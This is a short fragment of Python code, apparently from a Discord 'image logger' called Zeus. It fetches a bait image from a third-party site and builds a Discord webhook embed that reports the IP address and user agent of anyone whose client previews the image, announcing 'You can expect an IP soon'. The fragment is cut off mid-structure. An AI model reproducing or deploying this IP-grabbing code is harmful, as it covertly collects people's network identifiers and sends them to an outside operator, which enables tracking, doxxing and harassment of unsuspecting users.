...
bindata = requests.get('https://www.imgonline.com.ua/examples/8bit-picture.jpg').content
  ...
  "embeds": [
    {
      "title": "Zeus Alert.",
      "color": 16711803,
      "description": f"Discord previewed a Zeus Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Zeus"
      },
      "fields": [
